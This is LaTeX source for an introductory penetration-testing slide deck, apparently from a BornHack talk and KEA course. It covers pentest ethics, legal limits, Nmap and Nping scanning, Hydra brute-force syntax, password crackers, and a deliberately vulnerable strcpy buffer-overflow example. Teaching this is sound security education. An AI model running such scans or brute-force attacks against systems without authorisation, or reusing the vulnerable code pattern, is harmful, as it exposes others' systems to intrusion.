\documentclass[Screen16to9,17pt]{foils}
%\documentclass[16pt,landscape,a4paper,footrule]{foils}
\usepackage{zencurity-slides}

% {Pentest introduction - greatest hits}
% was from: {Penetration testing I\\Introduction to hacking and pentest methods}
% BornHack 2021 regular talk

% We will go through the greatest hits from https://github.com/kramse/security-courses/tree/master/presentations/pentest

% So expect to learn

% What is penetration testing
% Nmap how to get started, and a small test plan, how to scan a network using Nmap
% Get started blasting packets, from single packets with Nping and Scapy
% Trying wi-fi scan, I have some loaner USB cards
% Doing SNMP scanning, trying small brute-force using THC Hydra
% Get started with VXLAN hacking, THC IPv6 attacks etc.
% Get started with Metasploit using Metasploit Unleashed
% Goal is to point you towards resources, so you can get started with the fun of scanning networks, finding vulnerabilities - so you can remove them, reconfigure networks etc.

% You should install a Kali Linux as virtual machine, perhaps use this as inspiration: https://github.com/kramse/kramse-labs - the part about installing a Kali Linux

% You can leave early, but it will be hard to join late, so be there from the start and leave when you like, please :-D

% We will also use materials from courses described at https://zencurity.gitbook.io/ which are official ECTS accredited courses, part of the Diploma in IT Security at KEA Kompetence.


\begin{document}

%\rm
\selectlanguage{english}

\mytitlepage
{Pentest I Introduction and Basics}
%{Pentest introduction - greatest hits}

\LogoOn

%\dagsplan

\slide{Plan}

\begin{list1}
\item Subjects
\begin{list2}
\item What is penetration testing
\item Nmap how to get started, and a small test plan, how to scan a network using Nmap
\item Get started blasting packets, from single packets with Nping and Scapy
%\item Trying wi-fi scan, I have some loaner USB cards
\item Get started with hacking, attacks etc.
\end{list2}
\item Demos and recommendations for exercises
\begin{list2}
\item Running various tools -- I will show a small selection of a few tools
\item Suggest you all download Nmap -- available for Mac OS X, Windows and Linux \url{https://nmap.org/download}\\
It is NOT a malicious program, but anti-virus software might block \emph{hacker tools}
\item Note: exercise booklets on Github contain much more than we can go through, continue on your own
\end{list2}
\end{list1}



\slide{Goals}
\vskip 1 cm

\hlkimage{3cm}{dont-panic.png}
\centerline{\color{titlecolor}\LARGE Don't Panic!}


\begin{list1}
\item Introduce the term penetration testing and basic pentest methods
\item Introduce some of the basic tools in this genre of hacker tools
\item Create an understanding of hacker tools
\item Show a hacker lab and run some tools
\item Point you towards resources, so you can get started with the fun of pentesting tools
\end{list1}

\slide{Materials -- where to start}

\begin{list2}
\item This presentation -- slides for today, start here
\item Setup instructions for creating a Kali virtual machine:\\
\link{https://github.com/kramse/kramse-labs}
\item Getting started in infosec BornHack Youtube has the video \\{\footnotesize
\link{https://github.com/kramse/security-courses/tree/master/presentations/misc/getting-started-in-infosec}}
\item Nmap Workshop exercises\\{\footnotesize
\link{https://github.com/kramse/security-courses/blob/master/courses/pentest/nmap-workshop/nmap-workshop-exercises.pdf}}
\item Older Pentest course exercises\\{\footnotesize
\link{https://github.com/kramse/security-courses/blob/master/courses/pentest/kea-pentest/kea-pentest-exercises.pdf}}
\item Also the Simulated DDoS Workshop on BornHack 17-24 2024 -- among others:\\{\footnotesize
\link{https://github.com/kramse/security-courses/tree/master/presentations/pentest/simulated-ddos-workshop}}
\end{list2}

%\centerline{We cannot go through all of them, but feel free to ask questions later}

{\bf Start a download of Kali today, if you want to play with the tools tomorrow}\\
Recommend virtual machine download 64-bit \url{https://www.kali.org/get-kali/#kali-virtual-machines}

\slide{Books and Educational Materials}

\begin{list2}
\item \emph{The Linux Command Line: A Complete Introduction}, 2nd Edition\\
 by William Shotts, internet edition \link{https://sourceforge.net/projects/linuxcommand}
\item \emph{Linux Basics for Hackers Getting Started with Networking, Scripting, and Security in Kali}. OccupyTheWeb, December 2018, 248 pp. ISBN-13: 978-1-59327-855-7
\item \emph{Gray Hat Hacking: The Ethical Hacker's Handbook}, 6. ed. Allen Harper and others ISBN: 9781264268948
\item \emph{Web Application Security}, Andrew Hoffman, 2020, ISBN: 9781492053118
\item \emph{Practical Packet Analysis, Using Wireshark to Solve Real-World Network Problems}
by Chris Sanders, 3rd ed, ISBN: 978-1-59327-802-1
\item \emph{Hacking, 2nd Edition: The Art of Exploitation}, Jon Erickson, February 2008, ISBN-13: 9781593271442
\item \emph{Kali Linux Revealed Mastering the Penetration Testing Distribution}\\
\link{https://www.kali.org/}
\end{list2}


We teach using these books at Copenhagen School of Design and Technology (KEA)


\slide{Book: Practical Packet Analysis (PPA)}
\hlkimage{5cm}{PracticalPacketAnalysis3E_cover.png}

\emph{Practical Packet Analysis,
Using Wireshark to Solve Real-World Network Problems}
by Chris Sanders, 3rd Edition
April 2017, 368 pp.
ISBN-13:
978-1-59327-802-1
\link{https://nostarch.com/packetanalysis3}

{\bf Anything you know about technology will help you hack it, so learn basic functionality first}


\slide{Hacker -- cracker}

{\bfseries Short answer -- dont discuss this}

%Det lidt længere svar:\\
Yes, originally there was another meaning to hacker, but the media has perverted it and today, and since early 1990s it has meant breaking into stuff for the public

{\color{red}\hlkbig Today a hacker breaks into systems!}

Reference. Spafford, Cheswick, Garfinkel, Stoll, \ldots
- wrote about this and it was lost

Story is interesting and the old meaning is ALSO used in smaller communities, like hacker spaces full of hackers - doing fun and interesting stuff
\begin{list2}
\item \emph{Cuckoo's Egg: Tracking a Spy Through the Maze of Computer
 Espionage},  Clifford Stoll
\item \emph{Hackers: Heroes of the Computer Revolution},
Steven Levy
\item \emph{Practical Unix and Internet Security},
Simson Garfinkel, Gene Spafford, Alan Schwartz
\end{list2}

\slide{Hacker tools}

\begin{quote}
We realize that SATAN is a two-edged sword -- like
many tools, it can be used for good and for evil
purposes. We also realize that intruders (including
wannabees) have much more capable (read intrusive)
tools than offered with SATAN.
\end{quote}
Source:
\link{http://www.fish2.com/security/admin-guide-to-cracking.html}

\begin{list2}
\item I got into hacking due to the security papers from Spaff and others, like this:
\emph{Improving the Security of Your Site by Breaking Into it}, Dan Farmer and Wietse Venema, 1993
\item Later in 1995 released the software SATAN\\
\emph{Security Administrator Tool for Analyzing Networks}
\item Caused some commotion, panic and discussions, every script kiddie can hack, the Internet will melt down!
\end{list2}



\slide{Use hacker tools!}

\begin{list2}
\item Port scan can reveal holes in your defense
\item Web testing tools can crawl through your site and find problems
\item Pentesting is a verification and proactively finding problems
\item Its not a silverbullet and mostly find known problems in existing systems
\item Combined with honeypots they may allow better security
\end{list2}



\slide{Agreements for testing networks}

\begin{quote}\small
Danish Criminal Code\\
Straffelovens paragraf 263 Stk. 2. Med bøde eller fængsel indtil 1 år og 6 måneder straffes den, der uberettiget skaffer sig adgang til en andens oplysninger eller programmer, der er bestemt til at bruges i et informationssystem.
\end{quote}

Hacking can result in:
\begin{list2}
\item Getting your devices confiscated by the police
\item Paying damages to persons or businesses
\item If older getting a fine and a record -- even jail perhaps
\item Getting a criminal record, making it hard to travel to some countries and working in security
\item Fear of terror has increased the focus -- so dont step over bounds!
\end{list2}

Asking for permission and getting an OK before doing invasive tests, always!


\slide{Why even do security testing?}

\begin{list1}
\item Lots of security problems
\item Pentesting may be a requirement from external partners -- example VISA PCI standard
\end{list1}

\begin{list2}
\item Boss asking: should we do a security test?
\item CIO: hmm, okay
\item IT Admins: *sigh* -- I know the security sucks in places!
\item Its not your systems -- dont take the criticism personal, but as an opportunity to get things improved
\vskip 1cm
\item Pentest tools are great resources for doing discovery of assets, evaluating the security of large installations quickly -- in short using pentest tools makes you more efficient!
\end{list2}

\centerline{\Large Many see the benefits after doing a pentest, so try it!}


\slide{Benefits of having a planned security test done}

\begin{quote}
Goal of testing is to reduce risk for the systems and secure the organisation\\ from unexpected loss of data, image and increased costs.
\end{quote}

\begin{list1}
\item Intended audience:
\begin{list2}
\item IT-department and technical personnel
\item Management and board
\item External auditors, government, financial control VISA/PCI, the public
\end{list2}
\item Output from testing:
\begin{list2}
\item Reports with technical content and recommendations
\item Executive summary
\end{list2}
\end{list1}

Goal is not to find a scape goat to blame -- management allocates resources

If security is below in places more resources may be needed.


\slide{Planning a pentest}


\begin{list2}
\item Scope -- what is being tested
\item When is the testing done -- time frame, wall clock time
\item Where are the attacks coming from -- log files will contain the attacks\\
but other attacks from other sources are likely during the attacks, which must be blocked
\item We sometimes go broader than the scope -- perhaps checking the router in front with SNMP or doing a small port 80/tcp scan
\item Agree if Denial of Service is to be tested
\item TL;DR Rules of engagement for the project
\end{list2}


\slide{Selecting systems for testing}

\hlkimage{9cm}{overview-routing-customer-2015.png}

\begin{list2}
\item Routers on the way to critical systems and networks -- especially availability
\item Firewall -- is the environment protected sufficiently, discarding probes
\item Mail servers -- relay testing and also critical data
\item Web servers -- holds data, typically has a lot of functionality
\item Cloud systems, storage systems, anywhere data is saved
\end{list2}


\slide{Testing Agreement and Scope Example}

\begin{list1}
\item Usually the scope could include targets like these:
\begin{list2}
\item 192.168.1.1 -- firewall/router
\item 192.168.1.2 -- mail server
\item 192.168.1.3 -- web server
\item Test to be done from monday 1st until friday 5th
\item Testing done from 192.0.2.0/28
\end{list2}
\item When testing web servers and sites, especially API -- please include hostname, URLs, documentation. If not included some sites and functionality will NOT be tested!
\end{list1}


\slide{Reporting -- results}

\begin{list1}
\item What is in a pentest report:
\begin{list2}
\item Title, Table of contents, formal report thanks
\item Confidentiality agreement – Write ”Confidential” on each page
\item Executive summary – big companies always want this
\item Information about the scan done, what was it
\item Scope and targets
\item Review of all targets – detailed information and recommendations
\item Conclusion – may be more technical
\item Appendices – various information, Whois info about subnets and prefixes
\end{list2}
\item BTW When delivering a report, it is up to the organisation to decide which recommendations to implement
\end{list1}

Sample report available at: \link{https://github.com/kramse/pentest-report}

\slide{Rules of engagement -- rules and ethics for security testing}

\begin{list2}
\item NB: big difference between Denmark and other places!
\item Security consultant must not be the cause of new vulnerabilities due to the testing
\item Security consultant must not install new software on systems without previous agreement
\item Security consultant is not to leave insecure system administrator accounts or settings after testing
\item Security consultant always contact the customer in case of high-risk vulnerabilities
\item It is allowed to peek around in the network -- checking if there might be an insecure development or testing server near by
\item If you meet other security problems outside of the scope we still report them, but perhaps in an appendix
\end{list2}

\centerline{In general be careful of other people networks and systems}




\slide{Hacker tools}
% måske til reference afsnit?
\hlkimage{3cm}{hackers_JOLIE+1995.jpg}

\begin{list2}
\item Everyone use similar tools, see also \link{http://www.sectools.org/}
\item Portscanning Nmap, Nping -- test ports and services, Nping is great for firewall admins \link{https://nmap.org}
\item Metasploit Framework -- service scanning, exploit development and execution \link{https://www.metasploit.com/}
\item Dedicated niche scanners -- wifi Aircrack-ng, web Burp suite, Nikto, Skipfish \link{http://portswigger.net/burp/}
\item Wireshark avanced network sniffing tool -- \link{https://www.wireshark.org/}
\item and scripting, PowerShell, Unix shell, Perl, Python, Ruby, \ldots
\end{list2}

Picture: Acid Burn / Angelina Jolie Hackers 1995


\slide{OSI Model and Internet Protocols}

\hlkimage{10cm,angle=90}{images/compare-osi-ip.pdf}


\slide{Recommended technologies to learn}


So to accomplish the goal of using Nmap efficiently you need some basics

Networking: Basic Protocols from the Internet Protocols suite IP/TCP, or TCP/IP
\begin{list2}
\item Network Layer: Ethernet, Address Resolution Protocol (ARP), IPv4 and ICMP\\
Later add Wi-Fi and IPv6
\item Transport Layer: Transmission Control Protocol (TCP) and User Datagram Protocol (UDP)
\item Common upper layer: Dynamic Host Configuration Protocol (DHCP), Domain Name System (DNS),
Hypertext Transfer Protocol (HTTP)\\
Later add the encrypted/secure versions like Hypertext Transfer Protocol Secure (HTTPS) which uses Transport Layer Security (TLS)
\end{list2}

Pro tip: always say Ethernet frames and IP packets. No one uses datagram anymore.

Pro tip: If you \emph{really know DNS} you can make a huge impact in the malware area!

\slide{What happens now?}

\begin{list1}
\item Think like a hacker
\item Reconnaissance
\begin{list2}
\item ping sweep, port scan
\item OS detection -- TCP/IP or banner grabbing
\item Service scan -- rpcinfo, netbios, ...
\item telnet/netcat interact with services
\end{list2}
\item Exploit/test: Metasploit, Nikto, exploit programs
\item Cleanup/hardening not shown today, but:
\begin{list2}
\item Make a report or document findings
\item Change, improve and harden systems
\item Go through report with stakeholders, track progress
\item Update programs, settings, configurations, architecture
\end{list2}
\item You also need to show others that you are in control of security
\end{list1}


\slide{Hacker lab setup}

\hlkimage{8cm}{hacklab-1.png}

\begin{list2}
\item Hardware: any modern laptop with CPU and virtualisation\\
Don't forget to enable it in the BIOS
\item Software: your favourite operating system Windows, Mac, Linux, ...
\item Virtualisation software: VMware, Virtual box, pick your poison
\item Hacker software: Kali as a Virtual Machine \link{https://www.kali.org/}
\item Soft targets: Metasploitable, Linux, Microsoft Windows, Microsoft Exchange, Windows server, ...
\end{list2}

\slide{Kali Linux the pentest toolbox}

\hlkimage{14cm}{kali-linux.png}

\begin{list1}
\item  Kali \link{http://www.kali.org/}
\item 100.000s of videos on youtube alone, searching for kali and \$TOOL
\item Also versions for Raspberry Pi, mobile and other small computers
\end{list1}



\slide{Whois -- Where do IP addresses come from}

\begin{list1}
\item Magical numbers on the internet are administered by IANA \url{https://www.iana.org/}
\item They have handed out portions to the Region Internet Registries (RIR)
\begin{list2}
\item RIPE (Réseaux IP Européens)  \link{http://ripe.net}
\item ARIN American Registry for Internet Numbers \link{http://www.arin.net}
\item Asia Pacific Network Information Center \link{http://www.apnic.net}
\item LACNIC (Regional Latin-American and Caribbean IP Address Registry) - Latin America and some Caribbean Islands
\item AFRINIC \url{https://afrinic.net/}
\end{list2}
\item They are member based, and members are called Local Internet Registries (LIRs) og National Internet Registry (NIR)
\end{list1}

We use the whois program to look up addresses, can be found as web pages too



\slide{Ping}

\begin{list1}
\item Internet Control Message Protocol (ICMP)
\item The ping program works by sending \verb+ICMP ECHO request+ and we
expect an \verb+ICMP ECHO reply+
\item
\begin{alltt}
\small {\bfseries
$ ping 185.129.63.1}
PING 185.129.63.1 (185.129.63.1) 56(84) bytes of data.
64 bytes from 185.129.63.1: icmp_seq=1 ttl=54 time=8.14 ms
64 bytes from 185.129.63.1: icmp_seq=2 ttl=54 time=31.5 ms
64 bytes from 185.129.63.1: icmp_seq=3 ttl=54 time=22.4 ms
64 bytes from 185.129.63.1: icmp_seq=4 ttl=54 time=12.2 ms
^C
--- 185.129.63.1 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3004ms
rtt min/avg/max/mdev = 8.144/18.544/31.463/9.095 ms
\end{alltt}
\end{list1}

Try it yourself, this should work on most operating systems \verb+ping 185.129.63.1+


\slide{traceroute}

\begin{list2}
\item Another \emph{hacker program} is traceroute -- and I call it that since it uses the Time To Live (TTL) on IPv4 or Hop limit (IPv6) field in packets, not something that was designed as a feature
\item Researcher found that if they sent packets with low TTL and sent it to high numbered UDP ports, they would usually get an answer
\item Routers decrease the TTL counter, and send back ICMP messages, end hosts not listening on a port do the same
\item Traceroute can be done with various protocols, but usually Unix uses UDP and Windows uses ICMP (tracert)
\begin{alltt}
\small{\bfseries
$ traceroute 185.129.63.1}
traceroute to 185.129.63.1 (185.129.63.1),
30 hops max, 40 byte packets
 1  host11 (10.0.0.11)  3.577 ms  0.565 ms  0.323 ms
 2  router (185.129.63.1)  1.481 ms  1.374 ms  1.261 ms
\end{alltt}
\end{list2}

\slide{Hackers don't give a shit}

\hlkrightpic{9cm}{-3cm}{kiwicon-2009-hackers-dont-give-shit.jpg}

Your system is only for testing, development, ...

Your network is a research network, under construction, \\
being phased out, ...

Try something new, go to your management

Bring all the exceptions, all of them, update the risk \\
analysis figures - if this happens it is about 1mill DKK

Ask for permission to go full monty on your security

{\bf Think like attackers - don't hold back}




\slide{Hacking is magic}

\hlkimage{5cm}{wizard_in_blue_hat.png}

\vskip 1 cm

Hacking looks like magic


\slide{Hacking is not magic}

\hlkimage{15cm}{ninjas.png}

\vskip 1 cm
\centerline{Hacking only demands ninja training and knowledge others don't have}

\slide{}

\hlkimage{14cm}{kelly-sikkema-212376-unsplash.jpg}

\hfill {\footnotesize Photo by Kelly Sikkema on Unsplash}

\centerline{Whats the goal, where are the strawberries!}


\slide{Pin tumbler locks - how do they work}

\hlkimage{14cm}{lockpicking-1.png}
Source:
\link{https://en.wikipedia.org/wiki/Pin_tumbler_lock}

\begin{list2}
\item I often refer to lock-picking as an example of \emph{hacking}
\item You have a key, insert, turn -- it works
\item But another tool could perhaps push these pins?!
\end{list2}

\slide{Pin tumbler locks - how to pick them}

\hlkimage{12cm}{lockpicking-2.png}
Source:
\link{https://en.wikipedia.org/wiki/Pin_tumbler_lock}

\begin{list2}
\item It's just a question about knowledge and the right tools!
\end{list2}

\slide{Lock Picking}

\hlkimage{4cm}{Lockpicking-Set.jpg}

\begin{quote}\footnotesize
Lock picking is the practice of unlocking a lock by manipulating the components of the lock device without the original key.

Although lock-picking can be associated with criminal intent, it is an essential skill for the legitimate profession of locksmithing, and is also pursued by law-abiding citizens as a useful skill to learn, or simply as a hobby (locksport).

In some countries, such as Japan, lock-picking tools are illegal for most people to possess, but in many others, they are available and legal to own as long as there is no intent to use them for criminal purposes.
\end{quote}
Picture  and quote from \link{https://en.wikipedia.org/wiki/Lock_picking}


\slide{Demo: airodump og aircrack}

\hlkimage{6cm}{exercise}


\begin{list2}
\item Short demo
\item Later try yourself, find exercises about Wardriving and Aircrack-ng in kea-pentest-exercises.pdf
\item Getting started Aircrack-ng \link{https://aircrack-ng.org/doku.php?id=getting_started}
\end{list2}

\slide{Hacking example -- it is not magic}


{\bf MAC filtering in IEEE 802.11 wireless networks}
\begin{list2}
\item Yes, network card chips have a globally unique MAC address -- from production
\item Access points allow filtering of frames based on MAC
\item Only those matching an allowed list are forwarded -- has access to network
\item The method doesn't work for security though \smiley
\item First, most network cards and drivers allow you to change this MAC easily
\item Second, you can read the allowed ones, as the active systems on the network
\item Further there has been implementation problems in multiple access points
\end{list2}

\slide{Myths about MAC filtering}

The example with MAC filtering is a problematic myth

Why does it happen?
\begin{list2}
\item Marketing -- vendors would like to put as many "security features" on the labels and packages
\item Customer knowledge -- consumers know nothing about the technologies\\
Don't know what a MAC address i, and why should they
\item We are quite few that can understand it, we know what a MAC address is (at least now)
\end{list2}

Solutions
\begin{list2}
\item We must spread information about insecure methods for securing data and systems
\item We must spread information about secure methods for securing data and systems
\item And update our own understanding of those methods, in both groups
\end{list2}

\slide{MAC filtrering}

\hlkimage{12cm}{stupid-security.jpg}



\slide{Technically what is hacking}

\hlkimage{12cm}{buffer-overflow-3.pdf}


\slide{Internet today}

\hlkimage{10cm}{images/server-client.pdf}

\begin{list1}
\item Clients and servers
\item Rooted in academia
\item Protocols that are from 1983 and some older
\item Originally very little encryption, now mostly on https/TLS
\end{list1}

\slide{Trinity breaking in}

\hlkimage{14cm}{trinity-nmapscreen-hd-cropscale-418x250.jpg}
Very realistic -- comparable to hacking:\\
\link{https://nmap.org/movies/}\\
\link{https://youtu.be/51lGCTgqE_w}



\slide{Network mapping}

\hlkimage{12cm}{images/network-example.pdf}

\begin{list2}
\item Using traceroute, Nping and similar programs you can often discover topoly information about a network
\item Time to Live (TTL) for a packet is decremented for each router it crosses, if set low enough it will time out -- and return ICMP message sent
\item BTW Default Unix traceroute sends UDP packets, Windows tracert send ICMP packets\\
Use tools on Kali to try both protocols, or even others
\end{list2}


\slide{traceroute -- with UDP}

\begin{alltt}
\footnotesize # {\bfseries tcpdump -i en0 host 10.20.20.129 or host 10.0.0.11}
tcpdump: listening on en0
23:23:30.426342 10.0.0.200.33849 > router.33435: udp 12 {\bf [ttl 1]}
23:23:30.426742 safri > 10.0.0.200: {\bf icmp: time exceeded in-transit}
23:23:30.436069 10.0.0.200.33849 > router.33436: udp 12 {\bf [ttl 1]}
23:23:30.436357 safri > 10.0.0.200: {\bf icmp: time exceeded in-transit}
23:23:30.437117 10.0.0.200.33849 > router.33437: udp 12 {\bf [ttl 1]}
23:23:30.437383 safri > 10.0.0.200: {\bf icmp: time exceeded in-transit}
23:23:30.437574 10.0.0.200.33849 > router.33438: udp 12
23:23:30.438946 router > 10.0.0.200: icmp: router {\bf udp port 33438 unreachable}
23:23:30.451319 10.0.0.200.33849 > router.33439: udp 12
23:23:30.452569 router > 10.0.0.200: icmp: router {\bf udp port 33439 unreachable}
23:23:30.452813 10.0.0.200.33849 > router.33440: udp 12
23:23:30.454023 router > 10.0.0.200: icmp: router {\bf udp port 33440 unreachable}
23:23:31.379102 10.0.0.200.49214 > safri.domain:  6646+ PTR?
200.0.0.10.in-addr.arpa. (41)
23:23:31.380410 safri.domain > 10.0.0.200.49214:  6646 NXDomain* 0/1/0 (93)
14 packets received by filter
0 packets dropped by kernel
\end{alltt}

\slide{Really do Nmap your world}

\hlkimage{8cm}{nmap-zenmap.png}

\begin{list2}
\item Nmap is a port scanner, but does more
\item Finding your own infrastructure available from the guest network?
\item See your printers having all the protocols enabled AND a wireless?
\end{list2}

\slide{Basic Portscan}

\begin{list1}
\item What is port scanning
\item Testing all ports from 0/1 up to 65535
\item Goal is to identify open ports -- vulnerable services
\item Typically TCP and UDP scans
\item TCP scanning is more reliable than UDP scanning
\item TCP handshake is easy to see, due to session setup -- services must respond to SYN with SYN-ACK. Otherwise client programs like browsers will not work
\item UDP applications respond differently -- if at all\\
They might respond to queries and probes in the correct format, \\
If no firewall the operating systems will respond with ICMP on closed ports
\item Use Zenmap while learning Nmap
\end{list1}


\slide{TCP three-way handshake}

\hlkimage{45mm}{images/tcp-three-way.pdf}

\begin{list2}
\item {\bfseries TCP SYN half-open} scans
\item In the old days systems would only log a full TCP connection
  -- so a port scanner sending only SYN would be doing a \emph{stealth}-scans. Today we have Intrusion Detection Systems, so a lot of SYN without ever completing the connection is MORE suspicious
\item Note: sending many SYN packets can fill the session table on firewalls, and on servers -- preventing new connections -- also called {\bfseries SYN-flooding}
\end{list2}


\slide{Ping and port sweep}

\begin{list1}
\item Scanning across a network is called sweeping
\item Scans using ICMP ping will be a ping-sweep -- active IPs
\item Scans using specific ports are port-sweeps
\item Easy to detect using modern intrusion detection systems (IDS)
\vskip 2cm
Pro tip: If you are looking for an IDS, look at Suricata \link{https://suricata.io}\\
and Zeek \link{https://zeek.org/} -- together
\end{list1}

\slide{Nmap port sweep for web services}

\begin{alltt}\small
root@cornerstone:~#{\bfseries  nmap -p80,443 172.29.0.0/24}

Starting Nmap 6.47 ( http://nmap.org ) at 2015-02-05 07:31 CET
Nmap scan report for 172.29.0.1
Host is up (0.00016s latency).
PORT    STATE    SERVICE
{\color{darkgreen}80/tcp  open     http}
443/tcp filtered https
MAC Address: 00:50:56:C0:00:08 (VMware)

Nmap scan report for 172.29.0.138
Host is up (0.00012s latency).
PORT    STATE  SERVICE
{\color{darkgreen}80/tcp  open   http}
443/tcp closed https
MAC Address: 00:0C:29:46:22:FB (VMware)

\end{alltt}

\slide{Nmap port sweep after SNMP port 161/UDP}

\begin{alltt}\small
root@cornerstone:~#{\bfseries nmap -sU -p 161 172.29.0.0/24}
Starting Nmap 6.47 ( http://nmap.org ) at 2015-02-05 07:30 CET
Nmap scan report for 172.29.0.1
Host is up (0.00015s latency).
PORT    STATE         SERVICE
{\color{darkgreen}161/udp open|filtered snmp}
MAC Address: 00:50:56:C0:00:08 (VMware)

Nmap scan report for 172.29.0.138
Host is up (0.00011s latency).
PORT    STATE  SERVICE
{\bf{161/udp closed snmp}}
MAC Address: 00:0C:29:46:22:FB (VMware)
...
Nmap done: 256 IP addresses (5 hosts up) scanned in 2.18 seconds
\end{alltt}

Often possible on the inside LAN, where less firewalls are enabled

\slide{Nmap Advanced OS detection}

\begin{alltt}\footnotesize
root@cornerstone:~#{\bfseries nmap -A -p80,443 172.29.0.0/24}
Starting Nmap 6.47 ( http://nmap.org ) at 2015-02-05 07:37 CET
Nmap scan report for 172.29.0.1
Host is up (0.00027s latency).
PORT    STATE    SERVICE VERSION
80/tcp  open     http    Apache httpd 2.2.26 ((Unix) DAV/2 mod_ssl/2.2.26 OpenSSL/0.9.8zc)
|_http-title: Site doesn't have a title (text/html).
443/tcp filtered https
MAC Address: 00:50:56:C0:00:08 (VMware)
Device type: media device|general purpose|phone
Running: Apple iOS 6.X|4.X|5.X, Apple Mac OS X 10.7.X|10.9.X|10.8.X
OS details: Apple iOS 6.1.3, Apple Mac OS X 10.7.0 (Lion) - 10.9.2 (Mavericks)
or iOS 4.1 - 7.1 (Darwin 10.0.0 - 14.0.0), Apple Mac OS X 10.8 - 10.8.3 (Mountain Lion)
or iOS 5.1.1 - 6.1.5 (Darwin 12.0.0 - 13.0.0)
OS and Service detection performed.
Please report any incorrect results at http://nmap.org/submit/
\end{alltt}

\begin{list2}
\item Low level operating system identification, often I use \verb+nmap -A+
\item Send packets, observe responses, match with tables of known operating system fingerprints
\item An early reference for this was: \emph{ICMP Usage In Scanning} Version 3.0,
  Ofir Arkin, 2001 %\link{https://web.archive.org/web/20050210093427/http://www.sys-security.com/html/projects/icmp.html} % Original side er død
\end{list2}


\slide{Scan for Heartbleed and SSLv2/SSLv3}

Nmap includes Nmap scripting engine (NSE)

\hlkimage{5cm}{nmap-sslv2.png}

\begin{list1}
\item \verb+nmap -p 443 --script ssl-heartbleed <target>+\\
\link{https://nmap.org/nsedoc/scripts/ssl-heartbleed.html}
\item Almost every new popular vulnerability will have Nmap recipe
\end{list1}

\slide{Demo: Nmap and Zenmap}

\hlkimage{10cm}{nmap-zenmap.png}

\begin{list2}
\item Short demo, Nmap, Zenmap -- and don't forget Nping
\item Later try yourself, find exercises in nmap-workshop-exercises.pdf
\end{list2}

\slide{Nping from the Nmap package}

\begin{alltt}\footnotesize
root@KaliVM:~# nping --tcp -p 80 www.zencurity.com

Starting Nping 0.7.70 ( https://nmap.org/nping ) at 2018-09-07 19:06 CEST
SENT (0.0300s) TCP 10.137.0.24:3805 > 185.129.63.130:80 S ttl=64 id=18933 iplen=40  seq=2984847972 win=1480
RCVD (0.0353s) TCP 185.129.63.130:80 > 10.137.0.24:3805 SA ttl=56 id=49674 iplen=44  seq=3654597698 win=16384 <mss 1460>
SENT (1.0305s) TCP 10.137.0.24:3805 > 185.129.63.130:80 S ttl=64 id=18933 iplen=40  seq=2984847972 win=1480
RCVD (1.0391s) TCP 185.129.63.130:80 > 10.137.0.24:3805 SA ttl=56 id=50237 iplen=44  seq=2347926491 win=16384 <mss 1460>
SENT (2.0325s) TCP 10.137.0.24:3805 > 185.129.63.130:80 S ttl=64 id=18933 iplen=40  seq=2984847972 win=1480
RCVD (2.0724s) TCP 185.129.63.130:80 > 10.137.0.24:3805 SA ttl=56 id=9842 iplen=44  seq=2355974413 win=16384 <mss 1460>
SENT (3.0340s) TCP 10.137.0.24:3805 > 185.129.63.130:80 S ttl=64 id=18933 iplen=40  seq=2984847972 win=1480
RCVD (3.0387s) TCP 185.129.63.130:80 > 10.137.0.24:3805 SA ttl=56 id=1836 iplen=44  seq=3230085295 win=16384 <mss 1460>
SENT (4.0362s) TCP 10.137.0.24:3805 > 185.129.63.130:80 S ttl=64 id=18933 iplen=40  seq=2984847972 win=1480
RCVD (4.0549s) TCP 185.129.63.130:80 > 10.137.0.24:3805 SA ttl=56 id=62226 iplen=44  seq=3033492220 win=16384 <mss 1460>

Max rtt: 40.044ms | Min rtt: 4.677ms | Avg rtt: 15.398ms
Raw packets sent: 5 (200B) | Rcvd: 5 (220B) | Lost: 0 (0.00%)
Nping done: 1 IP address pinged in 4.07 seconds
\end{alltt}

Awesome tool for testing firewall rules, sending probes with specific source port etc.

\slide{Passwords are not chosen completely random}

\hlkimage{20cm}{50-most-used-passwords.png}

Source:
\link{https://wpengine.com/unmasked/}



\slide{Brute force}

\begin{list1}
\item We call it brute force -- when testing all possibilities
\end{list1}

\begin{alltt}\small
Hydra (c) by van Hauser / THC <vh@thc.org>
Syntax: hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]]
[-o FILE] [-t TASKS] [-g TASKS] [-T SERVERS] [-M FILE] [-w TIME]
[-f] [-e ns] [-s PORT] [-S] [-vV] server service [OPT]

Options:
  -S        connect via SSL
  -s PORT   if the service is on a different default port, define it here
  -l LOGIN  or -L FILE login with LOGIN name, or load several logins from FILE
  -p PASS   or -P FILE try password PASS, or load several passwords from FILE
  -e ns     additional checks, "n" for null password, "s" try login as pass
  -C FILE   colon seperated "login:pass" format, instead of -L/-P option
  -M FILE   file containing server list (parallizes attacks, see -T)
  -o FILE   write found login/password pairs to FILE instead of stdout
...
\end{alltt}

\slide{Cracking passwords -- JtR and Hashcat}


\begin{quote}
John the Ripper is a fast password cracker, currently available for
many flavors of Unix (11 are officially supported, not counting
different architectures), Windows, DOS, BeOS, and OpenVMS. Its primary
purpose is to detect weak Unix passwords.
\end{quote}

\begin{list2}
\item Hashcat is the world's fastest CPU-based password recovery tool.
\item oclHashcat-plus is a GPGPU-based multi-hash cracker using a brute-force attack (implemented as mask attack), combinator attack, dictionary attack, hybrid attack, mask attack, and rule-based attack.
\item oclHashcat-lite is a GPGPU cracker that is optimized for cracking performance. Therefore, it is limited to only doing single-hash cracking using Markov attack, Brute-Force attack and Mask attack.
\item John the Ripper password cracker old skool men stadig nyttig
\end{list2}

Source:\\
\link{https://hashcat.net/wiki/}\\
\link{http://www.openwall.com/john/}


\slide{Buffer overflows a C problem}

\begin{list1}
\item {\bfseries A buffer overflow} is what happens when writing more data than allocated in some area of memory. Typically the program will crash, but under certain circumstances an attacker can write structures allowing take over of return addresses, parameters for system calls or program execution.
\item {\bfseries Stack protection} is today used as a generic term for multiple technologies used in operating systems, libraries, compilers etc. that protect the stack and other structures from being overwritten or changed through buffer overflows. StackGuard
and Propolice are examples of this.
\end{list1}

Today we will not go more into detail about this, suffice it to say modern operating systems really employ a lot of methods for making buffer overflows harder and less likely to succeed. OpenBSD even relink the kernel on installation to randomize addresses.

\slide{Buffers and stacks, simplified}

\hlkimage{18cm}{buffer-overflow-1.pdf}

\begin{alltt}\small
main(int argc, char **argv)
\{      char buf[200];
        strcpy(buf, argv[1]);
        printf("%s\textbackslash{}n",buf);
\}
\end{alltt}

